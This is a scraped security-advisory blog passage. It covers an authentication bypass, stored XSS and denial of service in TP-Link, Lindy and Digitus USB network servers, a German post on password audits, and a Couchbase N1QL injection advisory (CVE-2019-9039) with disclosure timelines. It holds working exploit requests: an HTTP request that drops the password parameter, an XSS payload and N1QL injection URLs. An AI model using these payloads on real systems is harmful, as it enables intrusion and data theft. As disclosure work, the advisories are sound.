circumvent the access restrictions to the administrative interface. The attacker then can use all functions provided by the USB network server, including restricted ones. If the password is reused (which is strongly discouraged but often the case) this design error could give an attacker access to other systems that use the same password.

### Authentication Bypass in Web Administration Interface

*The following CVE IDs were issued for this vulnerability: CVE-2020-15055 (TP-Link), CVE-2020-15059 (Lindy), CVE-2020-15063 (Digitus).*

In some cases the password authentication requirement in the web interface can be bypassed when the password parameter is removed from the request. This enables an unauthenticated user to access privileged functions on the interface.
As an example, the following request will change the server name, a functionality that would normally only be available if the configured password was provided:

```
POST /csystem33.htm HTTP/1.1
Host: 192.168.0.10
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101
Firefox/60.0
Accept:
text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://192.168.0.10/csystem33.htm
Content-Type: application/x-www-form-urlencoded
Content-Length: 53
Connection: close
Upgrade-Insecure-Requests: 1
```
```
%24A0%24=New+Name+No+Password&%24B2%24=38&%24B3%24=39
```

As is visible in the request, no password is provided and the corresponding Parameter is removed entirely. Without the password parameter the authentication does not fail, but instead the server simply implies that no password was set, thus allowing the operation without any user authentication.

Because of that, unauthenticated users can access administrative functions on the system without knowledge of the administrative password, therefore bypassing the authentication. This effectively disables the access control for the entire administrative interface.

### Persistent Cross-Site Scripting

*The following CVE IDs were issued for this vulnerability: CVE-2020-15056 (TP-Link), CVE-2020-15060 (Lindy), CVE-2020-15064 (Digitus).*

The parameter for the server name is vulnerable to a stored Cross-Site Scripting ([XSS](https://research.hisolutions.com/2023/04/xss-auf-abwegen/)) attack. This results in the possibility for an attacker to execute JavaScript code in the context of the victims browser.

If the corresponding request is sent to the server, the server name gets embedded into the JavaScript file unfiltered and unescaped:

```
var myServer = new Server();
myServer.model = '';
myServer.manuf = '';
myServer.name = 'TestName';alert('Successful XSS');//';
myServer.hw = 'V. 2.000';
//myServer.tempFW = '2.255.255';
tempFWVersion = '';
myServer.fw = tempFWVersion.substring(0,1) + '.' +
tempFWVersion.substring(1,3);
myServer.mac = '34:e8:94:20:47:78';
```

The vulnerability allows attackers to execute JavaScript code in the context of the browser of the victim by manipulating the stored server name. Attackers in the local network could insert a custom script that is loaded each time an administrator visits the web administration interface. They can thereby gain persistent access to the web interface and attack other systems in the local network through the browser of the victim.
Normally, administrative access to the web interface would be needed to [exploit](https://research.hisolutions.com/2023/03/wir-nehmen-rtf-da-gibt-es-keine-makros-dafuer-aber-einen-exploit/) this vulnerability, which would lower the impact. In combination with other vulnerabilities (like the authentication bypass) this exploit works for all users with access to the system.

### Denial of Service

*The following CVE IDs were issued for this vulnerability: CVE-2020-15057 (TP-Link), CVE-2020-15061 (Lindy), CVE-2020-15065 (Digitus).*

Users can crash the USB network servers by sending long input values. For some lengths, the servers hang or act unexpectedly. while longer input values (e.g. 1103 characters) will crash them entirely. A reboot or sometimes reset of the device is needed to clear the issue.

After receiving too long input values the system no longer responds to network requests. The UDP broadcasts show that when setting a long server name other variables were most likely overwritten:

![Wireshark packet capture screenshot of the buffer overflow from the server name](data:image/gif;base64...)![Wireshark packet capture screenshot of the buffer overflow from the server name](https://research.hisolutions.com/wp-content/uploads/2020/07/USB-Abb3.jpg)
Figure 2: Buffer overflow from the server name (top: normal, bottom: after attack)

An attacker can use the buffer overflow vulnerability to impact the availability of the server. The shown behaviour indicates that the buffer overflow could also be used to execute functions or code on the system. This possibility was not investigated during the project.

## Remediation

The vendors TP-Link and Lindy provided an updated firmware that fixes the vulnerabilities.

When using a device for which no patch is available, make sure that the chosen password is not reused on any other system or application.
Access to the devices could also be restricted on network level to limit the possibility of an attacker accessing the web interface or sniffing the broadcast traffic.

## Responsible Disclosure Timeline

The vulnerabilities were reported to each of the vendors via e-mail. It was made clear that HiSolutions will follow defined [responsible disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) policy and aims to release information about the vulnerabilities in coordination with the vendor.
Each but one vendor reacted to the initial contact and in the following dialogue was provided with additional information on the vulnerabilities.
The vendors named in this advisory provided patches to mitigate the security issues. Hisolutions tested the patches for their effectiveness until the discovered vulnerabilities were closed and follow-up problems solved adequately.

[![](data:image/gif;base64...)![](data:image/gif;base64...)![](data:image/gif;base64...)![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2018/10/cropped-HiS_Logo_HintergrungWeiss-1_Research.jpg)](https://research.hisolutions.com/2020/04/passwort-audits/ "Passwort-Audits")

[29. April 202030. April 2020](https://research.hisolutions.com/2020/04/passwort-audits/)[Passwörter](https://research.hisolutions.com/category/themen/passwoerter/)
## [Passwort-Audits](https://research.hisolutions.com/2020/04/passwort-audits/)

Seit vielen Jahren beobachten wir problematische Trends bei der Verwendung von Passwörtern. Ob bei [Incident Response](https://research.hisolutions.com/2023/04/unser-schwachstellenreport-was-wurde-besser-was-nicht/) Einsätzen oder bei Penetrationstests – zu schwache Passwörter sind in den heutigen IT-Umgebungen noch viel zu häufig der entscheidende Knackpunkt, der zwischen Erfolg und Misserfolg eines Angriffs entscheidet.

Das wissen auch die Angreifer, und so ist wohl jeder über das Internet erreichbare Server ständigen Brute-Force-Angriffen ausgesetzt. Teilweise entwendet Schadsoftware auch nach einem erfolgreichen Angriff weitere Active Directory Passwort-Hashes, um zusätzliche Zugriffsmöglichkeiten in der Zukunft zu sichern, wie Anfang des Jahres bei Trickbot [beobachtet wurde](https://www.bleepingcomputer.com/news/security/trickbot-now-steals-windows-active-directory-credentials/).

Leider bilden Passwörter aber noch bei vielen Systemen und Anwendungen den einzigen Schutz vor unbefugten Angreifern. Die im Windows Active Directory eingebauten Komplexitätsregeln bieten nur eine geringe Hilfestellung bei der Wahl eines sicheren Passworts und sind in der Praxis nicht ausreichend.

Auch wo theoretisch die Einführung von 2-Faktor-Authentifizierung möglich wäre, gestaltet sich die praktische Umsetzung oft schwieriger als erhofft und wird daher verschoben.

Um Kunden einen Überblick über die Passwort-Qualität der von den eigenen Mitarbeitern verwendeten Passwörter zu geben, führt HiSolutions deswegen praktische Prüfungen der Passwortqualität durch. Dafür verfügen wir über ein Labor mit Spezialhardware für das Durchführen von hochparallelisierten Angriffen zur Ermittlung von Kennwörtern. Das System wurde in einer Vielzahl von Penetrationstests und Passwort-Prüfungen erfolgreich eingesetzt. Der Angriffsprozess wird dabei stetig weiterentwickelt und an neueste technische und organisatorische Erkenntnisse angepasst. Das System ermöglicht es, mehrere hundert Milliarden Password-Kandidaten pro Sekunde auszuprobieren.

Bei einer praktischen Prüfung der Passwortqualität werden die Passwort-Hashes von den Domänen-Controllern extrahiert und auf das Spezialsystem bei HiSolutions übertragen. Dort wird dann versucht, in vorgegebener Zeitspanne so viele Passwörter wie möglich zu ermitteln. Bei Bedarf, z.B. wenn die Daten das Netzwerk unter keinen Umständen verlassen dürfen, kann das Spezialsystem der HiSolutions auch in die Räumlichkeiten des Auftraggebers transportiert und dort angeschlossen werden.

Dazu werden unter anderem eine Vielzahl an Wörterbüchern, öffentlichen Passwort-Listen, speziellen Passwort-Regeln und -Masken und eine Kombination verschiedener Angriffsmethoden verwendet. Die verwendeten Regelwerke und Angriffsmethoden werden in Abhängigkeit von den erzielten Ergebnissen kontinuierlich manuell nachjustiert. Zudem werden auftraggeberspezifische Informationen wie beispielsweise spezielle Wörterbücher und bereits ermittelte Passwörter in die weiteren Angriffe einbezogen.

Die Ergebnisse der Prüfung werden im Anschluss ausgewertet und bewertet. Die daraus getroffenen Einschätzungen und Ergebnisse werden mit geeigneten Handlungsempfehlungen zur Verbesserung der organisatorischen und technischen Vorgaben für den Passworteinsatz in einem Prüfbericht dokumentiert. Der Auftraggeber erhält zusätzlich die Liste der Accounts mit gebrochenen Passwörtern, damit diese im Anschluss geändert werden können. Die gewonnenen Klartext-Passwörter werden aus Datenschutzgründen und gegebenenfalls enthaltenen sensiblen Daten grundsätzlich nicht offengelegt. Alle Passwort-Hashes und Klartext-Passwörter werden nach Abschluss des Projekts von den Systemen der HiSolutions sicher gelöscht.

[![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2019/06/Couchbase_Inc._official_logo.png)](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/ "N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039")

[21. Juni 201926. Juni 2023](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)[Advisories](https://research.hisolutions.com/category/advisories/)
## [N1QL Injection in Couchbase Sync Gateway – CVE-2019-9039](https://research.hisolutions.com/2019/06/n1ql-injection-in-couchbase-sync-gateway-cve-2019-9039/)

Within the scope of a recent penetration test, HiSolutions security consultants encountered a Couchbase Sync Gateway and discovered a previously unknown, high-impact injection vulnerability (CVE-2019-9039).

**Background
Information**

The Couchbase Sync Gateway is a product
developed by Couchbase Inc. as part of their mobile product portfolio. It is
used to connect web, mobile, and IoT apps (Couchbase Lite) to the backend
database (Couchbase Server). The publically accessible Sync Gateway synchronizes
the data with the internal backend database servers and employs various
security and integration features.

Couchbase uses a database query language called *N1QL* (<https://www.couchbase.com/products/n1ql> ) (pronounced “nickel”). *N1QL* extends SQL for JSON. It
combines the syntax of traditional SQL with the benefits and flexibility of
NoSQL databases.

From a security standpoint, N1QL is comparatively
unexplored. SQL injections are a well-known and broadly explored security risk
for traditional SQL databases. With increased use of NoSQL databases, NoSQL injection
has become a more widely known topic as well. For both vulnerabilities,
numerous tools, articles and presentations exist that detail every aspect of
exploitation.

**N1QL
Injections**

A 2015 blog post (<https://blog.couchbase.com/couchbase-and-n1ql-security-centeredgesoftware/>) discusses various aspects of N1QL injections. N1QL is claimed to be more
resistant to injection attacks than traditional SQL. This is due to the
following syntactic differences:

* Query stacking is not possible
  in N1QL. That is, terminating a previous query with a semicolon and appending
  another query will result in an invalid syntax error in N1QL.
* N1QL does not allow commenting
  out just the remainder of a line. N1QL only allows C-style comment blocks (/\*
  comment \*/). This prevents an attacker from terminating a query by inserting
  “/\*” or “–“ at the injection point.

The blog post also mentions generic advice for
preventing injections. Apart from that, information regarding N1QL injections
is very sparse.

**The vulnerability**

HiSolutions consultants discovered that the Couchbase
Sync Gateway in combination with a Couchbase Server is affected by a previously
undisclosed N1QL-injection vulnerability in the REST API. An attacker with
access to the public REST API can insert additional N1QL statements through the
parameters “startkey” and “endkey” of the “\_all\_docs” endpoint.

The following request triggers an error:

[https://host:port/{db}/\_all\_docs?startkey=1%271&endkey=](https://host:port/%7Bdb%7D/_all_docs?startkey=1%271&endkey=)

The client will receive the following error statement
indicating a N1QL error:

```
{"rows":[
{"error":"Internal Server Error","reason":"Internal error: [3000] syntax error - at 1"}
```

On a server with the standard installation of Couchbase
Server and Couchbase Sync Gateway, the following error will appear in the
logfile:

```
2019-02-15T14:00:51.892+01:00 [WRN] Error when querying index using
statement: [SELECT META(`test-getting-started`).id as id,
meta(`test-getting-started`).xattrs._sync.rev as r,
meta(`test-getting-started`).xattrs._sync.sequence as s,
meta(`test-getting-started`).xattrs._sync.channels as c FROM
`test-getting-started` WHERE meta(`test-getting-started`).xattrs._sync.sequence
> 0 AND META(`test-getting-started`).id NOT LIKE '\\_sync:%' AND
meta(`test-getting-started`).xattrs._sync IS NOT MISSING AND
(meta(`test-getting-started`).xattrs._sync.flags IS MISSING OR
BITTEST(meta(`test-getting-started`).xattrs._sync.flags,1) = false) AND
META(`test-getting-started`).id >= '1'1' ORDER BY META(`test-getting-started`).id] --
base.(*CouchbaseBucketGoCB).Query() at bucket_n1ql.go:63
```

The error (injection point at ‚1‘1′ near the bottom) shows that it is possible to break out of the original query and insert additional N1QL code. An additional character after the apostrophe seems to be required to trigger the error.

Furthermore, it is possible to end the current query
and thereby skip the rest of the original query by inserting a null byte at the
end of the manipulated parameter value.

The insertion of an additional comparison can be used
to validate the injection. When inserting an additional requirement that is
always true (“AND 1=1”), the original results are returned:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d1%00&endkey=
```

Inserting a statement that always evaluates to false (“AND
1=0”) yields no results:

```
/{db}/_all_docs?startkey=123%27%20AND%201%3d0%00&endkey=
```

The following request can be used to extract
additional information from a default installation:

```
/{db}/_all_docs?startkey=123%27%20UNION%20ALL%20SELECT
%20TOSTRING(BASE64_DECODE("U1FMLUl
uamVjdGlvbg=="))%20as%20id%3b%00&endkey=
```

The inserted N1QL statement “UNION ALL SELECT
TOSTRING(BASE64\_DECODE(„U1FMLUluamVjdGlvbg==“)) as id” adds the
following line to the output and shows that N1QL functions and queries are
evaluated:

```
{"rows":[
{"key":"SQL-Injection","id":"SQL-Injection","value":{"rev":""}}
...
```

The same injection works for the parameter “endkey”.

Additional modification of the query seems to be
required to make UNION-injections work when channels and users are set up for
the database. Data extraction methods that rely on comparisons will work as shown.

**Impact:**

An attacker with access to the public REST API is able
to issue additional N1QL statements and extract sensitive data or call
arbitrary N1QL functions. By issuing nested queries with CPU-intensive
operations, he might be able to cause increased resource usage and denial of
service conditions.

**Remediation:**

Traditional remediations for SQL injection vulnerabilities
also apply to N1QL. Features like parameterized N1QL queries should be used to
prevent the injection of N1QL statements into the original query.

As the vulnerability exists in the default Couchbase
Sync Gateway, an update will fix the problem. HiSolutions has responsibly reported
the issue to the vendor. The fix is available in Sync Gateway v2.5 as well as
in v2.1.3.

Short-term remediation can be implemented by blocking
all requests containing “startkey” or “endkey” on the web-interface.

**[Responsible Disclosure](https://research.hisolutions.com/2023/02/wenn-der-white-hat-hacker-anruft-aber-niemand-rangeht/) Timeline**

15.02.2019 – HiSolution initially notifies security@couchbase.com with vulnerability details and the internal
responsible disclosure guideline.

20.02.2019 – Couchbase acknowledges the vulnerability
and states that an engineering team is working on the issue. Couchbase offers
to help with the CVE request to [MITRE](https://research.hisolutions.com/2023/03/medientipp-maerz-2023/).

23.02.2019 – HiSolutions inquires whether the
engineering team was able to reproduce the issue and requests an ETA for a
patch. HiSolutions notifies Couchbase that a CVE number was requested.

23.02.2019 – MITRE assigns CVE-2019-9039 for the
vulnerability.

26.02.2019 – Couchbase sends an email to HiSolutions with
their assessment of the CVSS (<https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L>). Couchbase states in this email that a patch is under
development and that they will follow up with an ETA. Couchbase requests the
CVE number.

26.02.2019 – HiSolutions sends the CVE number to
Couchbase and questions the assessed CVSS. User interaction should be “none”
from HiSolutions perspective (CVSS v3 Vector: [AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?vector=AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:L/A:L)).

26.02.2019 – Couchbase explains their assessment of
the CVSS and states that they will follow up an ETA for the patch.

25.03.2019 – HiSolutions inquires  if an ETA is available and explains the
assessment of the User Interaction CVSS vector.

12.04.2019 – HiSolutions inquires if the last email
was received successfully. HiSolutions reminds Couchbase that the issue is
scheduled for disclosure on 21.05.2019 and request to be notified if more time
is needed by Couchbase.

15.04.2019 – Couchbase apologizes for the delayed
response. The patch for the Sync Gateway is expected at the end of April. Couchbase
agrees to a public disclosure on 21.05.2019. Couchbase informs HiSolutions that
they will list the issue on a changed website under <https://www.couchbase.com/resources/security> within a table containing all vulnerabilities, fix release dates, versions,
and affected products.

14.05.2019 – HiSolutions notices that the patch is
applied in the latest public version. HiSolutions sends an inquiry regarding
the vulnerability table on the website and if 21.05.2019 is still good for the
disclosure.

21.05.2019 – HiSolutions postpones the disclosure
because no answer was received.

11.06.2019 – HiSolutions inquires regarding the table
on the website and a new disclosure date. A delivery failure for the contact
address of the initial contact within the security team is received. The email is
resent to the security team with the request for an answer by another team
member.

12.06.2019 – Couchbase replies that the fix is
included in Sync Gateway v2.5 as well as in v2.1.3. The release notes for both
products will be updated in the following days to include a reference to the
vulnerability. Couchbase is actively working on the vulnerability table. While
unclear if the table will be finished until 21.06.2019, HiSolutions can
disclose the issue on 21.06.2019 if Couchbase has updated the release release
notes until then.

**Further references**

<https://docs.couchbase.com/dotnet-sdk/2.2/prepared-statements.html> <https://docs.couchbase.com/java-sdk/2.7/n1ql-query.html#devguide-named-placeholders>

* [Elektronische Patientenakte (ePA): nicht so sicher](https://research.hisolutions.com/2025/01/elektronische-patientenakte-epa-nicht-so-sicher/)16. Januar 2025
* [NSO vs. Whatsapp](https://research.hisolutions.com/2025/01/nso-vs-whatsapp/)16. Januar 2025
* [Windows-BitLocker-Probleme](https://research.hisolutions.com/2025/01/windows-bitlocker-probleme/)16. Januar 2025
* [Wahlsoftware 2.0](https://research.hisolutions.com/2025/01/wahlsoftware-2-0/)16. Januar 2025
* [Kritische Abhängigkeiten in unserem (digitalen) Alltag](https://research.hisolutions.com/2024/12/kritische-abhaengigkeiten-in-unserem-digitalen-alltag/)12. Dezember 2024
* [iOS 18: Sicherheitsfeatures und Mythen über Mobilgeräte](https://research.hisolutions.com/2024/12/ios-18-sicherheitsfeatures-und-mythen-ueber-mobilgeraete/)12. Dezember 2024
* [Technische Geräte und Remote-Zugriffe durch Hersteller](https://research.hisolutions.com/2024/12/technische-geraete-und-remote-zugriffe-durch-hersteller/)12. Dezember 2024
* [DDoS-Attacke auf das Internet Archive: Ein Schlag gegen die digitale Bewahrung](https://research.hisolutions.com/2024/11/ddos-attacke-auf-das-internet-archive-ein-schlag-gegen-die-digitale-bewahrung/)14. November 2024
* [Das Passwort in der Excel-Tabelle](https://research.hisolutions.com/2024/11/das-passwort-in-der-excel-tabelle/)14. November 2024
* [Hackerparagraph: Neue Version, alte Probleme](https://research.hisolutions.com/2024/11/hackerparagraph-neue-version-alte-probleme/)14. November 2024
* [Seitenkanal des Monats: Wenn die Handy-Rückseite vibriert](https://research.hisolutions.com/2024/11/seitenkanal-des-monats-wenn-die-handy-rueckseite-vibriert/)14. November 2024
* [Sieht der Fernseher mit?](https://research.hisolutions.com/2024/10/sieht-der-fernseher-mit/)17. Oktober 2024

[Angriff](https://research.hisolutions.com/tag/angriff/)
[Black hat](https://research.hisolutions.com/tag/black-hat/)
[Browser](https://research.hisolutions.com/tag/browser/)
[BSI](https://research.hisolutions.com/tag/bsi/)
[Cloud](https://research.hisolutions.com/tag/cloud/)
[Corona](https://research.hisolutions.com/tag/corona/)
[CVE](https://research.hisolutions.com/tag/cve/)
[Cyberangriff](https://research.hisolutions.com/tag/cyberangriff/)
[Cyberattacken](https://research.hisolutions.com/tag/cyberattacken/)
[Cybersecurity](https://research.hisolutions.com/tag/cybersecurity/)
[Datenschutz](https://research.hisolutions.com/tag/datenschutz/)
[Emotet](https://research.hisolutions.com/tag/emotet/)
[Exchange](https://research.hisolutions.com/tag/exchange/)
[Hacker](https://research.hisolutions.com/tag/hacker/)
[Hackerangriff](https://research.hisolutions.com/tag/hackerangriff/)
[HAFNIUM](https://research.hisolutions.com/tag/hafnium/)
[Incident Response](https://research.hisolutions.com/tag/incident-response/)
[KI](https://research.hisolutions.com/tag/ki/)
[KRITIS](https://research.hisolutions.com/tag/kritis/)
[Künstliche Intelligenz](https://research.hisolutions.com/tag/kuenstliche-intelligenz/)
[Linux](https://research.hisolutions.com/tag/linux/)
[Malware](https://research.hisolutions.com/tag/malware/)
[Microsoft](https://research.hisolutions.com/tag/microsoft/)
[Pandemie](https://research.hisolutions.com/tag/pandemie/)
[Passwort](https://research.hisolutions.com/tag/passwort/)
[Penetrationstest](https://research.hisolutions.com/tag/penetrationstest/)
[Phishing](https://research.hisolutions.com/tag/phishing/)
[ProxyLogon](https://research.hisolutions.com/tag/proxylogon/)
[Quantencomputer](https://research.hisolutions.com/tag/quantencomputer/)
[Ransomware](https://research.hisolutions.com/tag/ransomware/)
[Safety](https://research.hisolutions.com/tag/safety/)
[Schadsoftware](https://research.hisolutions.com/tag/schadsoftware/)
[Schwachstelle](https://research.hisolutions.com/tag/schwachstelle/)
[Security](https://research.hisolutions.com/tag/security/)
[Server](https://research.hisolutions.com/tag/server/)
[Shitrix](https://research.hisolutions.com/tag/shitrix/)
[Sicherheitslücken](https://research.hisolutions.com/tag/sicherheitsluecken/)
[Supply Chain Security](https://research.hisolutions.com/tag/supply-chain-security/)
[Trojaner](https://research.hisolutions.com/tag/trojaner/)
[Verschlüsselung](https://research.hisolutions.com/tag/verschluesselung/)
[Vulnerability](https://research.hisolutions.com/tag/vulnerability/)
[Zeroday](https://research.hisolutions.com/tag/zeroday/)

* [Advisories](https://research.hisolutions.com/category/advisories/) (25)
* [Allgemein](https://research.hisolutions.com/category/allgemein/) (72)
* [Digital Workplace](https://research.hisolutions.com/category/digital-workplace/) (1)
* [Forensics](https://research.hisolutions.com/category/forensics/) (1)
* [ITSM](https://research.hisolutions.com/category/itsm/) (1)
* [News](https://research.hisolutions.com/category/news/) (393)
* [Publikationen](https://research.hisolutions.com/category/publikationen/) (4)
  + [Kolumne](https://research.hisolutions.com/category/publikationen/kolumne/) (2)
* [Themen](https://research.hisolutions.com/category/themen/) (115)
  + [Blockchain](https://research.hisolutions.com/category/themen/blockchain/) (2)
  + [Cloud](https://research.hisolutions.com/category/themen/cloud/) (9)
  + [Corona](https://research.hisolutions.com/category/themen/corona/) (4)
  + [Cyberwar](https://research.hisolutions.com/category/themen/cyberwar/) (7)
  + [ICS](https://research.hisolutions.com/category/themen/ics/) (1)
  + [Incidents](https://research.hisolutions.com/category/themen/incidents/) (18)
    - [Hafnium](https://research.hisolutions.com/category/themen/incidents/hafnium/) (10)
    - [Log4Shell](https://research.hisolutions.com/category/themen/incidents/log4shell/) (3)
  + [ISMS](https://research.hisolutions.com/category/themen/isms/) (1)
  + [KI/ML](https://research.hisolutions.com/category/themen/ki-ml/) (6)
  + [KMU](https://research.hisolutions.com/category/themen/kmu/) (1)
  + [Kritis](https://research.hisolutions.com/category/themen/kritis/) (6)
  + [Kryptographie](https://research.hisolutions.com/category/themen/kryptographie/) (7)
  + [Malware](https://research.hisolutions.com/category/themen/malware/) (5)
  + [Netzwerk](https://research.hisolutions.com/category/themen/netzwerk/) (7)
  + [OSINT](https://research.hisolutions.com/category/themen/osint/) (1)
  + [Passwörter](https://research.hisolutions.com/category/themen/passwoerter/) (4)
  + [Penetrationstest](https://research.hisolutions.com/category/themen/penetrationstest/) (7)
  + [Phishing](https://research.hisolutions.com/category/themen/phishing/) (3)
  + [Ransomware](https://research.hisolutions.com/category/themen/ransomware/) (8)
  + [Red Teaming](https://research.hisolutions.com/category/themen/red-teaming/) (1)
  + [Risikomanagement](https://research.hisolutions.com/category/themen/risikomanagement/) (6)
  + [SASE](https://research.hisolutions.com/category/themen/sase/) (1)
  + [Schwachstelle](https://research.hisolutions.com/category/themen/schwachstelle/) (26)
  + [Security Engineering](https://research.hisolutions.com/category/themen/security-engineering/) (7)
  + [Supply Chain](https://research.hisolutions.com/category/themen/supply-chain/) (3)
  + [Weiterbildung](https://research.hisolutions.com/category/themen/weiterbildung/) (2)
  + [Zeroday](https://research.hisolutions.com/category/themen/zeroday/) (6)
* [Threat Intelligence](https://research.hisolutions.com/category/threat-intelligence/) (1)
* [Veranstaltungen](https://research.hisolutions.com/category/veranstaltungen/) (3)
### Hier schreiben

* ![Abraham Söyler](data:image/gif;base64...)![Abraham Söyler](https://research.hisolutions.com/wp-content/uploads/2024/10/Abraham-Soeyler_Business-200x200.jpg)

  [Abraham Söyler](https://research.hisolutions.com/author/soeyler/ "Abraham Söyler")
* ![Cass Rebbelin](data:image/gif;base64...)![Cass Rebbelin](https://research.hisolutions.com/wp-content/uploads/2023/12/Cass-Rebbelin_Business-150x150.jpg)

  [Cass Rebbelin](https://research.hisolutions.com/author/rebbelin/ "Cass Rebbelin")
* ![Constantin Kirsch - HiSolutions AG](data:image/gif;base64...)![Constantin Kirsch - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Constantin-Kirsch_200x200_intern.jpg)

  [Constantin Kirsch](https://research.hisolutions.com/author/constantink/ "Constantin Kirsch")
* ![Daniel Jedecke - HiSolutions](data:image/gif;base64...)![Daniel Jedecke - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Daniel-Jedecke_200x200_intern.jpg)

  [Daniel Jedecke](https://research.hisolutions.com/author/jedi/ "Daniel Jedecke")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/07/David-Mathiszik_200x200_intern.png)

  [David Mathiszik](https://research.hisolutions.com/author/davidm/ "David Mathiszik")
* ![Denis Werner - HiSolutions](data:image/gif;base64...)![Denis Werner - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Denis-Werner_200x200_intern.png)

  [Denis Werner](https://research.hisolutions.com/author/denisw/ "Denis Werner")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Joerg-Schneider-1.jpg)

  [Dr. Jörg Schneider](https://research.hisolutions.com/author/schneider/ "Dr. Jörg Schneider")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Folker-Schmidt-1-1.jpg)

  [Folker Schmidt](https://research.hisolutions.com/author/folkers/ "Folker Schmidt")
* ![Franz Gläser](data:image/gif;base64...)![Franz Gläser](https://research.hisolutions.com/wp-content/uploads/2025/01/Franz-Gläser_200x200_intern.jpg)

  [Franz Gläser](https://research.hisolutions.com/author/glaeser/ "Franz Gläser")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2022/11/Heike_Knobbe_Blog.jpg)

  [Heike Knobbe](https://research.hisolutions.com/author/knobbe/ "Heike Knobbe")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/10/Holger-von-Rhein_200x200_intern.png)

  [Holger von Rhein](https://research.hisolutions.com/author/holger/ "Holger von Rhein")
* ![Justus Tartz](data:image/gif;base64...)![Justus Tartz](https://research.hisolutions.com/wp-content/uploads/2024/01/Justus-Tartz_Business-Zuschnitt-150x150.jpg)

  [Justus Tartz](https://research.hisolutions.com/author/justust/ "Justus Tartz")
* ![](data:image/gif;base64...)![](https://research.hisolutions.com/wp-content/uploads/2023/05/Lars-Burhop_200x200_intern.jpg)

  [Lars Burhop](https://research.hisolutions.com/author/larsb/ "Lars Burhop")
* ![Lisa Lobmeyer - HiSolutions](data:image/gif;base64...)![Lisa Lobmeyer - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Lisa-Lobmeyer_intern_200x200.jpg)

  [Lisa Lobmeyer](https://research.hisolutions.com/author/lisal/ "Lisa Lobmeyer")
* ![Martin Glaser](data:image/gif;base64...)![Martin Glaser](https://research.hisolutions.com/wp-content/uploads/2023/12/Martin-Glaser_Business-150x150.jpg)

  [Martin Glaser](https://research.hisolutions.com/author/glaser/ "Martin Glaser")
* ![Michael Sehring - HiSolutions](data:image/gif;base64...)![Michael Sehring - HiSolutions](https://research.hisolutions.com/wp-content/uploads/2023/03/Michael-Sehring_200x200_intern.jpg)

  [Michael Sehring](https://research.hisolutions.com/author/michaels/ "Michael Sehring")
* ![Nicolas Sprenger, HiSolutions AG](data:image/gif;base64...)![Nicolas Sprenger, HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/06/Nicolas-Sprenger_intern_200x200.jpg)

  [Nicolas Sprenger](https://research.hisolutions.com/author/nicolas-sprenger/ "Nicolas Sprenger")
* ![Oliver Saynisch](data:image/gif;base64...)![Oliver Saynisch](https://research.hisolutions.com/wp-content/uploads/2023/07/Oliver-Saynisch_Business-150x150.jpg)

  [Oliver Saynisch](https://research.hisolutions.com/author/saynisch/ "Oliver Saynisch")
* ![Pascal Boxen](data:image/gif;base64...)![Pascal Boxen](https://research.hisolutions.com/wp-content/uploads/2023/07/Pascal-Boxen_Business-150x150.jpg)

  [Pascal Boxen](https://research.hisolutions.com/author/boxen/ "Pascal Boxen")
* ![Ronny Dobra - HiSolutions AG](data:image/gif;base64...)![Ronny Dobra - HiSolutions AG](https://research.hisolutions.com/wp-content/uploads/2024/05/Ronny-Dobra_200x200_intern.jpg)

  [Ronny Dobra](https://research.hisolutions.com/author/ronnyd/ "Ronny Dobra")
* ![Torge Ewald](data:image/gif;base64...)![Torge Ewald](https://research.hisolutions.com/wp-content/uploads/2023/07/Torge-Ewald_Original_Business-150x150.jpg)

  [Torge Ewald](https://research.hisolutions.com/author/ewald/ "Torge Ewald")

* [Twitter: @hisolutions](https://twitter.com/hisolutions)
* [LinkedIn](https://de.linkedin.com/company/hisolutions-ag)
* [Xing](https://www.xing.com/companies/hisolutionsag)
* research@hisolutions.com
* [Mastodon](https://infosec.exchange/%40hisolutions)

* [Kontakt](https://research.hisolutions.com/kontakt/)
* [HiSolutions AG](https://www.hisolutions.com)
* [Impressum](https://www.hisolutions.com/impressum/)
* [Datenschutzhinweise](https://www.hisolutions.com/datenschutz)

© 2025 HiSolutions Research. Stolz präsentiert von [Sydney](https://athemes.com/theme/sydney/)



=== Content from research.hisolutions.com_30cf217e_20250121_012420.html ===


[Zum Inhalt springen](#content)

[![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](data:image/gif;base64...)![HiSolutions Research](https://research.hisolutions.com/wp-content/uploads/2020/12/HiSolutions_Research_Logo_CMYK_test.png)](https://research.hisolutions.com/ "HiSolutions Research")

* [News](https://research.hisolutions.com/category/news/)
* [Advisories](https://research.hisolutions.com/category/advisories/)
* [Forschungsprojekte](https://research.hisolutions.com/forschungsprojekte/)
  + [AQUA-IT-Lab](https://research.hisolutions.com/forschungsprojekte/aqua-it-lab/)
  + [ITS.OVERVIEW](https://research.hisolutions.com/forschungsprojekte/its-overview/)
